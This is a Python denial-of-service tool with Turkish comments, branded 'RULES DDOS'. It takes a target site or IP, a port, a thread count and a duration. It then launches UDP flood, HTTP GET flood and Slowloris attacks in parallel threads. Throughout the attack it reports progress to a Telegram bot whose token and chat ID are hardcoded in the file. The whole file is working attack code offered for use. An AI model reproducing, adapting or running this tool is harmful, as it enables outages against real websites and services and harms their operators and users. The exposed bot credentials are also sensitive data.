# -*- coding: utf-8 -*-
import socket
import threading
import requests
import time
import random
import pyfiglet
import os

# === SENİN TELEGRAM BİLGİLERİN ===
TOKEN = "8110267443:AAHNAgx0Yleg6JKLXomoTuhB_zEte-g-8HI"
CHAT_ID = "6534222591"
TG_URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
# =================================

# TELEGRAM'A GÖNDER
def tg(mesaj):
    try:
        requests.post(TG_URL, data={'chat_id': CHAT_ID, 'text': mesaj}, timeout=5)
    except: pass

# UDP FLOOD
def udp_flood(ip, port, size=1024):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(size)
    sent = 0
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            if sent % 1000 == 0:
                tg(f"[UDP] {sent} paket → {ip}:{port}")
        except:
            break

# HTTP FLOOD
def http_flood(url):
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Googlebot/2.1",
            "curl/7.68.0"
        ])
    }
    while True:
        try:
            requests.get(url, headers=headers, timeout=3)
            tg(f"[HTTP] İstek → {url}")
        except:
            pass

# SLOWLORIS
def slowloris(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
        while True:
            sock.send(b"X-a: b\r\n")
            time.sleep(15)
    except:
        pass

# ANA SALDIRI
def ddos_attack():
    print(pyfiglet.figlet_format("RULES DDOS"))
    print("\033[1;35mTELEGRAM: @RULES TOOL| KANALA KATIL!\033[0m\n")

    hedef = input("\033[93m[?] Hedef Site/IP: \033[0m").strip()
    if "http" in hedef:
        url = hedef
        ip = socket.gethostbyname(hedef.replace("http://", "").replace("https://", "").split("/")[0])
    else:
        ip = hedef
        url = f"http://{ip}"

    port = int(input("\033[93m[?] Port (80): \033[0m") or 80)
    bot_sayisi = int(input("\033[93m[?] Bot Sayısı (1000): \033[0m") or 1000)
    sure = int(input("\033[93m[?] Süre (saniye, 300): \033[0m") or 300)

    tg(f"DDOS BAŞLADI!\nHedef: {hedef}\nIP: {ip}:{port}\nBot: {bot_sayisi}\nSüre: {sure} sn")

    print(f"\n\033[96m[SALDIRI BAŞLADI] {bot_sayisi} BOT → {hedef}\033[0m")
    
    # BOTLARI BAŞLAT
    for i in range(bot_sayisi):
        if i % 3 == 0:
            threading.Thread(target=udp_flood, args=(ip, port)).start()
        elif i % 3 == 1:
            threading.Thread(target=http_flood, args=(url,)).start()
        else:
            threading.Thread(target=slowloris, args=(ip, port)).start()
        time.sleep(0.01)

    # SÜRE BİTTİ
    time.sleep(sure)
    tg(f"DDOS BİTTİ!\nHedef: {hedef}\nToplam bot: {bot_sayisi}")
    print(f"\n\033[91m[SALDIRI BİTTİ] {hedef} YATMIŞ OLMALI!\033[0m")

# ANA
if __name__ == "__main__":
    ddos_attack()